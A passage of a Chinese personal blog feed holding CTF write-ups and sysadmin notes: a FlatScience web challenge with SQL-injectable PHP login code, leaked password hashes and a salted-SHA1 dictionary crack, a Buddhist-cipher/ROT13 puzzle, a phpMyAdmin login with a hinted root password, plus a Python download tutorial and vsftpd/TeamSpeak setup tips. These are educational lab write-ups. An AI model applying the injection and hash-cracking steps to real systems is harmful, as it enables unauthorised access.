alt="quzheng"></p><p>根据提示，刚刚拿到的应该是密码。</p><p>解压里面的压缩包，获得文件flag.png</p><p><img src="/posts/2020-internet-security/quzheng13_5.png" alt="quzheng"></p><p>hex修改一下图高</p><p><img src="/posts/2020-internet-security/quzheng13_6.png" alt="quzheng"></p><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>先用御剑扫出后台，然后进入phpadmin数据库后台，比赛中已经提示了数据库密码是roothashnopasswd，试出帐号为root，登录进去以后在里面翻一番，找到flag</p><p><img src="/posts/2020-internet-security/web1.png" alt="quzheng"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有些东西该记住的还是要记住的，不然忘得很快，这次和叶师傅、付师傅配合得很好，不愧是他们两个，躺着得我非常幸福。还有就是不能过于纠结一些题目，他们往往容易成为时间刺客。</p><p>2020年4月27日</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;拿到题目挺兴奋的，因为有一点小经验，所以分析起来不算费力，有一些答案很快就找到了。这次对杂项的分析比较快速，毕竟见过类似的，取证的大家收放的
      
    
    </summary>
    
    
    
      <category term="取证" scheme="https://ensuperb.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>如来十三掌</title>
    <link href="https://ensuperb.github.io/posts/13beats-From-XCTF/"/>
    <id>https://ensuperb.github.io/posts/13beats-From-XCTF/</id>
    <published>2020-04-24T15:13:14.000Z</published>
    <updated>2020-06-19T03:50:12.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc-如来十三掌"><a href="#Misc-如来十三掌" class="headerlink" title="[Misc] 如来十三掌"></a>[Misc] 如来十三掌</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一般来说不是<strong>如来十八掌</strong>嘛？（伏笔）</p><p>拿到文件, 名字为_833e81c19b2b4726986bd6a606d64f3c.docx_看了很多文档有关信息，感觉没有什么猫腻。</p><p>打开文档，有以下天书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</span><br></pre></td></tr></table></figure><p>说到天书，加上标题有如来，就想到了<strong>与佛论禅</strong>。在文段加上‘佛曰：’</p><p>解出来是这样的。</p><p><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><p>拿到base64上解，乱码，换一个思路，回首有看一下标题。十三？谷歌搜索： <code>13 解码</code> 找到了<code>ROT 13</code></p><p>用ROT 13 解一下。得到<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code>，再放到base64康康，貌似有解，拿到flag。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没有思路的时候要记得审题。(开启你的脑洞)</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>#Base64 #ROT13 #与佛论禅</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc-如来十三掌&quot;&gt;&lt;a href=&quot;#Misc-如来十三掌&quot; class=&quot;headerlink&quot; title=&quot;[Misc] 如来十三掌&quot;&gt;&lt;/a&gt;[Misc] 如来十三掌&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;head
      
    
    </summary>
    
    
    
      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>FlatScience</title>
    <link href="https://ensuperb.github.io/posts/FlatScience-From-XCTF/"/>
    <id>https://ensuperb.github.io/posts/FlatScience-From-XCTF/</id>
    <published>2020-04-24T14:23:58.000Z</published>
    <updated>2020-06-19T03:50:12.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web-FlatScience"><a href="#Web-FlatScience" class="headerlink" title="[Web] FlatScience"></a>[Web] FlatScience</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>拿到网址，把连接都点了一遍，有一些PDF文件，其他还没发现有啥。</p><p>康康robots.txt 。有以下发现。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /login.php</span><br><span class="line"><span class="string">Disallow:</span> /admin.php</span><br></pre></td></tr></table></figure><p>在/login.php中发现存在注入。 /admin.php比较顽固。</p><p>在login里尝试里一段时间的注入后，有点不理想，点开html源码看看，发现如下</p><p><code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code> 加个参数在login后面看看，源码给露出来了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>); </span><br><span class="line">    <span class="comment">// 上面就是注入点</span></span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">        <span class="comment">// 成功就返回得到的数组。返回到row</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        <span class="comment">// 如果返回了row， 那么就在cookie输出。</span></span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到Cookies</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; expires=Tue, 21-Apr-2020 10:25:35 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure><p>URL转码清理一下可以看到这个表的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Users(</span><br><span class="line">    id int primary key,</span><br><span class="line">    name varchar(255),</span><br><span class="line">    password varchar(255),</span><br><span class="line">    hint varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>name</th><th>password</th><th>hint</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>3fab54a50e770d830c0416df817567662a9dc85c</td><td>my+fav+word+in+my+fav+paper?!</td></tr><tr><td>2</td><td>fritze</td><td>54eae8935c90f467427f05e4ece82cf569f89507</td><td>my+love+is aci? (wh_9651002)</td></tr><tr><td>3</td><td>hansi</td><td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td><td>password</td></tr></tbody></table><p>按照hint里面的说法，这个密码是他最喜欢的词，而且还是在论文里边？！</p><p>好，懂了。把全站的PDF文件整下来，然后一个一个词碰撞试试。</p><h3 id="程序思路"><a href="#程序思路" class="headerlink" title="程序思路"></a>程序思路</h3><ol><li>递归获取站点的所有超链接资源，放入集合。（为什么是集合，集合它不重复呀）</li><li>得到的集合用正则把PDF资源筛选出来，逐个下载到本地。</li><li>把PDF转成文本后遍历文本里的所有词，加盐后使用SHA-1加密，拿加密后的值与得到的HASH值进行碰撞。</li></ol><p>碰撞结果 <code>ThinJerboa</code></p><p><img src="/posts/FlatScience-From-XCTF/Result.jpg" alt="Result"></p><p>（爬虫的写得太破就不放出来了。）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>递归的结束条件一定要掌控好，不然既浪费时间也容易造成内存问题。数据库的查询语句要扎实才容易分析出破绽所在。最后，我这里是碰巧就在Robots.txt撞到了两登录入口，普通情况下还是扫描一下为常规操作。</p><h2 id="所使用的Python库"><a href="#所使用的Python库" class="headerlink" title="所使用的Python库"></a>所使用的Python库</h2><ul><li>重点<ul><li>pdfplumber</li><li>bs.beautifulsoup</li><li>re</li><li>hashlib</li><li>requests</li></ul></li><li>次要<ul><li>os</li><li>time</li></ul></li></ul><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>#数据库 #SQLite #递归 #PDF转纯文本 #碰撞</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web-FlatScience&quot;&gt;&lt;a href=&quot;#Web-FlatScience&quot; class=&quot;headerlink&quot; title=&quot;[Web] FlatScience&quot;&gt;&lt;/a&gt;[Web] FlatScience&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
    
      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>翻译-使用Python下载文件的简单示例</title>
    <link href="https://ensuperb.github.io/posts/Trans-PythonDownload/"/>
    <id>https://ensuperb.github.io/posts/Trans-PythonDownload/</id>
    <published>2020-03-29T13:10:20.000Z</published>
    <updated>2020-06-19T03:50:12.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Python下载文件的简单示例"><a href="#使用Python下载文件的简单示例" class="headerlink" title="使用Python下载文件的简单示例"></a>使用Python下载文件的简单示例</h1><p>本教程中，您将学习如何使用不同的Python模块从Web下载文件。另外,你也会下载到一些常规文件、网页、Amazon S3以及其他资源。</p><p>最后，你将能习得如何攻克可能遇到的各种挑战，例如下载重定向文件，下载大文件，完成多线程下载以及其他策略。</p><h2 id="使用-requests"><a href="#使用-requests" class="headerlink" title="使用 requests"></a>使用 requests</h2><p>你可以使用 <code>requests</code> 模块从一个URL中下载文件。</p><p><img src="/posts/Trans-PythonDownload/1585465981253.png" alt="1585465981253"></p><p>只需使用<code>requests</code>模块的<code>get</code>方法获取URL，然后将结果存储到名为<code>myfile</code>的变量中即可。然后，将变量的内容写入文件。</p><h2 id="使用-wget"><a href="#使用-wget" class="headerlink" title="使用  wget"></a>使用  wget</h2><p>您还可以使用Python的<code>**wget**</code>模块从URL下载文件。可以使用pip安装wget模块，如下：</p><p><code>pip install wget</code></p><p>思考下列代码，我们可以用下列代码下载Python的Logo图标：</p><p><img src="/posts/Trans-PythonDownload/1585466498286.png" alt="1585466498286"></p><p>在此代码中，URL以及路径（另存图像的路径）将传递到wget模块的<code>download</code>方法。</p><h2 id="下载重定向文件"><a href="#下载重定向文件" class="headerlink" title="下载重定向文件"></a>下载重定向文件</h2><p>在本节中，你将学习利用<code>requests</code>模块从一个URL中重定向到另一个PDF文件的URL下载。该URL的内容如下：</p><p><code>https://readthedocs.org/projects/python-guide/downloads/pdf/latest/</code></p><p>要下载此PDF文件，请使用以下代码：</p><p><img src="/posts/Trans-PythonDownload/1585467146244.png" alt="1585467146244"></p><p>在此代码中，指定URL是我们要做的第一步。 然后，我们使用请求模块的get方法来获取URL的内容。在get方法中，我们将<code>allow_redirects</code>选项设置为True，这将允许URL重定向，并且将重定向后的内容分配给变量<code>myfile</code> 。</p><p>最后，我们打开一个文件来写入获取的内容。</p><h2 id="分块下载大文件"><a href="#分块下载大文件" class="headerlink" title="分块下载大文件"></a>分块下载大文件</h2><p>思考下列代码:</p><p><img src="/posts/Trans-PythonDownload/1585468455325.png" alt="1585468455325"></p><p>首先，像以往那样使用requests模块的get方法，但是这次，我们将stream属性设置为True。</p><p>然后，在当前工作目录中创建一个名为PythonBook.pdf的文件并打开以进行写入。</p><p>然后，指定一次要下载的块大小。 我们将其设置为1024个字节，遍历每个块，然后将这些块写入文件中，直到块迭代完成为止。</p><p>界面不漂亮？ 不用担心，稍后我们将显示进度条以供下载!</p><h2 id="下载多个文件（并行-批量下载）"><a href="#下载多个文件（并行-批量下载）" class="headerlink" title="下载多个文件（并行/批量下载）"></a>下载多个文件（并行/批量下载）</h2><p>为了能同时下载多个文件，请导入以下模块：</p><p><img src="/posts/Trans-PythonDownload/1585468844820.png" alt="1585468844820"></p><p>导入<code>os</code>和<code>time</code>模块以便于检测下载这些文件需要多少时间。</p><p>模块<code>ThreadPool</code>   使您可以使用池运行多个线程或进程。</p><p>让我们创建一个简单的函数，将响应分块发送到文件:</p><p><img src="/posts/Trans-PythonDownload/1585468954020.png" alt="1585468954020"></p><p>这里的URL是一个二维数组，用于指定要下载的页面的路径和URL。</p><p><img src="/posts/Trans-PythonDownload/1585469171823.png" alt="1585469171823"></p><p>如上一节所述，将URL传递给request.get。 最后，打开文件（URL中指定的路径）并写入页面内容。</p><p>现在，我们可以分别为每个URL调用此函数，也可以同时为所有URL调用此函数。让我们分别在for循环中为每个URL进行操作并计时：</p><p><img src="/posts/Trans-PythonDownload/1585469441476.png" alt="1585469441476"></p><p>现在，用以下代码替换for循环：</p><p><code>ThreadPool(9).imap_unordered(url_response, urls)</code></p><p>运行脚本。</p><h2 id="使用进度条下载"><a href="#使用进度条下载" class="headerlink" title="使用进度条下载"></a>使用进度条下载</h2><p>进度栏是客户端模块的UI小部件。 要安装客户端模块，请键入以下命令：</p><p><code>pip install clint</code></p><p>思考以下代码：</p><p><img src="/posts/Trans-PythonDownload/1585469724876.png" alt="1585469724876"></p><p>在这段代码中，我们导入了<code>requests</code>模块，然后从<code>clint.textui</code>中导入<code>progress</code>模块。 唯一的区别在于for循环。 在将内容写入文件时，我们使用了<code>progress</code>模块的<code>bar</code>方法。</p><h2 id="使用urllib下载网页"><a href="#使用urllib下载网页" class="headerlink" title="使用urllib下载网页"></a>使用urllib下载网页</h2><p>在本节中，我们将使用<code>urllib</code>下载网页。</p><p><code>urllib</code>库是Python的标准库，因此你无需安装它。</p><p>以下代码行可以轻松下载网页：</p><p><code>urllib.request.urlretrieve(&#39;url&#39;, &#39;path&#39;)</code></p><p>在此处指定要另存为的URL，以及要在其中存储的路径：</p><p><code>urllib.request.urlretrieve(&#39;https://www.python.org/&#39;, &#39;c:/users/LikeGeeks/documents/PythonOrganization.html&#39;)</code></p><p>在这段代码中，我们使用了<code>urlretrieve</code>   方法并传递了文件的URL，以及我们将保存文件的路径。 文件扩展名为.html。</p><h2 id="通过代理下载"><a href="#通过代理下载" class="headerlink" title="通过代理下载"></a>通过代理下载</h2><p>如果需要使用代理下载文件，则可以使用<code>urllib</code>模块中的<code>ProxyHandler</code>。 </p><p>思考以下代码：</p><p><img src="/posts/Trans-PythonDownload/1585470256861.png" alt="1585470256861"></p><p>在此代码中，我们创建了代理对象，并通过调用<code>urllib</code>的<code>build_opener</code>方法打开了代理传递了代理对象。 然后，我们对检索页面的发送请求。另外，你可以和官方文档那样使用<code>requests</code>模块。</p><p><img src="/posts/Trans-PythonDownload/1585470544198.png" alt="1585470544198"></p><p>只需导入请求模块并创建您的代理对象。</p><h2 id="使用urllib3"><a href="#使用urllib3" class="headerlink" title="使用urllib3"></a>使用urllib3</h2><p>urllib3是<code>urllib</code>模块的改进版本。 您可以使用pip下载并安装它：</p><p><code>pip install urllib3</code></p><p> 我们将获取一个网页，并使用urllib3将其存储在文本文件中。</p><p>导入以下模块： <code>import urllib3, shutil</code></p><p>当处理文件时，将使用<code>shutil</code>模块。</p><p>现在，像这样初始化URL字符串变量：</p><p><code>url = &#39;https://www.python.org/&#39;</code></p><p>然后，我们使用urllib3模块的<code>PoolManager</code>   跟踪必要的连接池。</p><p><code>c = urllib3.PoolManager()</code></p><p>创建一个文件：</p><p><code>filename = &quot;test.txt&quot;</code></p><p>最后，我们发送GET请求以获取URL并打开一个文件，并将响应写入该文件：</p><p><img src="/posts/Trans-PythonDownload/1585480101907.png" alt="1585480101907"></p><h2 id="使用Boto3从S3下载文件"><a href="#使用Boto3从S3下载文件" class="headerlink" title="使用Boto3从S3下载文件"></a>使用Boto3从S3下载文件</h2><p>要从Amazon S3下载文件，您可以使用Python boto3模块。</p><p>在开始之前，您需要使用pip安装awscli模块：</p><p><code>pip install awscli</code></p><p>对于AWS配置，运行以下命令：</p><p><code>aws configure</code></p><p>现在，输入您的详细信息为：</p><p><img src="/posts/Trans-PythonDownload/1585480250254.png" alt="1585480250254"></p><p>要从Amazon S3下载文件，请导入boto3和botocore。 Boto3是用于Python的Amazon SDK，它用于访问Amazon Web服务（例如S3）。 Botocore提供了与Amazon Web服务进行交互的命令行服务。</p><p>Botocore自带awscli。 要安装boto3，请运行以下命令：</p><p><code>pip install boto3</code></p><p>现在导入以下两个模块：</p><p><code>import boto3, botocore</code></p><p>从亚马逊下载文件时，我们需要三个参数：</p><ol><li>Bucket的名字</li><li>您需要下载的文件的名称</li><li>下载后的文件名</li></ol><p>初始化变量：</p><p><img src="/posts/Trans-PythonDownload/1585480775151.png" alt="1585480775151"></p><p>现在，初始化一个变量以使用会话资源。 为此，我们将调用boto3的<code>resource()</code>方法并传递服务，即s3：</p><p><code>service = boto3.resource(&#39;s3&#39;)</code></p><p>最后，使用<code>download_file</code>   方法并传递变量：</p><p><code>service.Bucket(bucket).download_file(file_name, downloaded_file)</code></p><h2 id="使用-asyncio"><a href="#使用-asyncio" class="headerlink" title="使用 asyncio"></a>使用 asyncio</h2><p>asyncio模块专注于处理系统事件。 它围绕事件循环工作，该事件循环等待事件发生，然后对该事件做出反应。 反应可能是调用另一个函数。 此过程称为事件处理。 asyncio模块使用协程进行事件处理。</p><p><code>import asyncio</code></p><p>现在，定义如下所示的异步协程方法：</p><p><img src="/posts/Trans-PythonDownload/1585481146331.png" alt="1585481146331"></p><p>关键字async表示这是一个本地asyncio协同程序。 在协同程序的主体内部，我们有await关键字，该关键字返回某个值。 还可以使用return关键字。</p><p>现在，让我们使用协程创建代码以从网络下载文件：</p><p><img src="/posts/Trans-PythonDownload/1585481497114.png" alt="1585481497114"></p><p>在此代码中，我们创建了一个异步协程函数，该函数下载文件并返回一条消息。</p><p>然后，我们有另一个异步协程称为<code>main_func</code>等待URL，并使所有URL置于队列中。 asyncio的等待功能等待协程完成。</p><p>现在要启动协程，我们必须使用<code>get_event_loop()</code>方法将协程放入事件循环中，最后，使用<code>run_until_complete()</code>方法执行事件循环。</p><p>使用Python下载文件很有趣。 希望本教程对您有所帮助！</p><h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;使用Python下载文件的简单示例&quot;&gt;&lt;a href=&quot;#使用Python下载文件的简单示例&quot; class=&quot;headerlink&quot; title=&quot;使用Python下载文件的简单示例&quot;&gt;&lt;/a&gt;使用Python下载文件的简单示例&lt;/h1&gt;&lt;p&gt;本教程中，您将学习如
      
    
    </summary>
    
    
    
      <category term="翻译" scheme="https://ensuperb.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>[vsftpd]服务搭建中遇到的问题以及解决方案</title>
    <link href="https://ensuperb.github.io/posts/ideatodealproblemof-vsftpd-whenbuild/"/>
    <id>https://ensuperb.github.io/posts/ideatodealproblemof-vsftpd-whenbuild/</id>
    <published>2019-10-20T11:00:57.000Z</published>
    <updated>2020-06-19T03:50:12.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题一-500-OOPS-cannot-change-directory-product-ftpfile"><a href="#问题一-500-OOPS-cannot-change-directory-product-ftpfile" class="headerlink" title="问题一 500 OOPS: cannot change directory:/product/ftpfile"></a><strong>问题一</strong> <strong>500 OOPS: cannot change directory:/product/ftpfile</strong></h2><p><strong>500 OOPS: priv_sock_get_cmd</strong> <strong>远程主机关闭连接</strong></p><p>情景：ftp服务打开后,能建立链接，甚至root用户能进入</p><p>解决方案：</p><blockquote><p>这边的问题纯粹是权限问题，或者是用户的设置问题，首先一开始<strong>弹出的错误是这个</strong> <strong>500 OOPS: cannot change directory:ftpfolder</strong>和文章上的 <code>/product/ftpfile</code> 的绝对路径有些出入，所以检查了一下 <code>/etc/passwd</code>里面的用户发现是用户的父目录没有设置正确，设置后就能成功用设置的用户登陆进指定的文件夹。</p></blockquote><h2 id="问题二-refusing-to-run-with-writable-root-inside-chroot"><a href="#问题二-refusing-to-run-with-writable-root-inside-chroot" class="headerlink" title="问题二 refusing to run with writable root inside chroot()"></a><strong>问题二</strong> <strong>refusing to run with writable root inside chroot()</strong></h2><p>情景： 在我设置了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">chroot_local_user</span>=<span class="literal">YES</span></span><br><span class="line"><span class="attr">chroot_list_enable</span>=<span class="literal">NO</span></span><br></pre></td></tr></table></figure><p>之后就出现了这个问题</p><p>猜测：指定的用户不再指定的白名单里</p><p>实际上：这个问题发生在最新的这是由于下面的更新造成的：</p><blockquote><p>Add stronger checks for the configuration error of running with a writeable root directory inside a chroot(). This may bite people who carelessly turned on chroot_local_user but such is life.</p></blockquote><p>解决方案：</p><blockquote><p>从2.3.5之后，vsftpd增强了安全检查，如果用户被限定在了其主目录下，则该用户的主目录不能再具有写权限了！如果检查发现还有写权限，就会报该错误。</p><p>要修复这个错误，可以用命令chmod a-w /home/user去除用户主目录的写权限，注意把目录替换成你自己的。或者你可以在vsftpd的配置文件中增加下列两项中的一项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_writeable_chroot=YES</span><br></pre></td></tr></table></figure></blockquote><p>我的解决方案：直接添加<code>allow_writeable_chroot=YES</code></p><hr><p>值得参考的文章：</p><ol><li><p><a href="https://blog.csdn.net/weiyuefei/article/details/51564367" target="_blank" rel="noopener">史上最详细的vsftpd配置文件讲解</a></p></li><li><p><a href="https://blog.csdn.net/bluishglc/article/details/42398811" target="_blank" rel="noopener">vsftpd 配置:chroot_local_user与chroot_list_enable详解</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;问题一-500-OOPS-cannot-change-directory-product-ftpfile&quot;&gt;&lt;a href=&quot;#问题一-500-OOPS-cannot-change-directory-product-ftpfile&quot; class=&quot;headerl
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>搭建超好玩的ts3server重点事项</title>
    <link href="https://ensuperb.github.io/posts/breakpointofbuildts3server/"/>
    <id>https://ensuperb.github.io/posts/breakpointofbuildts3server/</id>
    <published>2019-08-04T06:24:29.000Z</published>
    <updated>2020-07-11T13:15:46.034Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【teamspeak-amp-VPS】搭建超好玩的ts3server的突破点"><a href="#【teamspeak-amp-VPS】搭建超好玩的ts3server的突破点" class="headerlink" title="【teamspeak&amp;VPS】搭建超好玩的ts3server的突破点"></a>【teamspeak&amp;VPS】搭建超好玩的ts3server的突破点</h1><blockquote><p>teamspeak这款语音社交软件真是太棒了，可惜就是高版本得服务器不能被低版本的客户端连接上。</p><p>在这里我就不再详细阐述具体如何搭建的了。</p></blockquote><p>搭建概要：创建专有非登录用户，解压软件包并添加到机器的服务中，开启端口</p><hr><h2 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h2><ol><li>接受协议(软件目录生成此文件)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch .ts3server_license_accepted</span><br></pre></td></tr></table></figure><ol start="2"><li>记得将所有权交给专属用户</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R &lt;username&gt;:&lt;group&gt; &lt;path_teamspeak&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>允许端口</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p udp --dport 9987 -j ACCEPT</span></span><br><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p udp --sport 9987 -j ACCEPT</span></span><br><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p tcp --dport 30033 -j ACCEPT</span></span><br><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p tcp --sport 30033 -j ACCEPT</span></span><br><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p tcp --dport 10011 -j ACCEPT</span></span><br><span class="line">root@teamspeak:~<span class="comment"># iptables -A INPUT -p tcp --sport 10011 -j ACCEPT</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">root@teamspeak:~<span class="comment"># ufw allow 9987</span></span><br><span class="line">root@teamspeak:~<span class="comment"># ufw allow 10011</span></span><br><span class="line">root@teamspeak:~<span class="comment"># ufw allow 30033</span></span><br></pre></td></tr></table></figure><ol start="4"><li>服务配置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@teamspeak:~<span class="comment"># vim /lib/systemd/system/teamspeak.service</span></span><br><span class="line"><span class="comment"># 适当根据目录修改</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=Team Speak 3 Server</span><br><span class="line">After=network.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory=/home/teamspeak/</span><br><span class="line">User=teamspeak</span><br><span class="line">Group=teamspeak</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/home/teamspeak/ts3server_startscript.sh start inifile=ts3server.ini</span><br><span class="line">ExecStop=/home/teamspeak/ts3server_startscript.sh stop</span><br><span class="line">PIDFile=/home/teamspeak/ts3server.pid</span><br><span class="line">RestartSec=15</span><br><span class="line">Restart=always</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p><a href="https://linux.cn/article-8087-1.html" target="_blank" rel="noopener"><strong>What is ufw？</strong></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;【teamspeak-amp-VPS】搭建超好玩的ts3server的突破点&quot;&gt;&lt;a href=&quot;#【teamspeak-amp-VPS】搭建超好玩的ts3server的突破点&quot; class=&quot;headerlink&quot; title=&quot;【teamspeak&amp;amp;V
      
    
    </summary>
    
    
    
      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>2019-日常学习手记</title>
    <link href="https://ensuperb.github.io/posts/2019-07-daliylearning/"/>
    <id>https://ensuperb.github.io/posts/2019-07-daliylearning/</id>
    <published>2019-07-30T06:00:00.000Z</published>
    <updated>2020-10-17T05:04:47.069Z</updated>
    
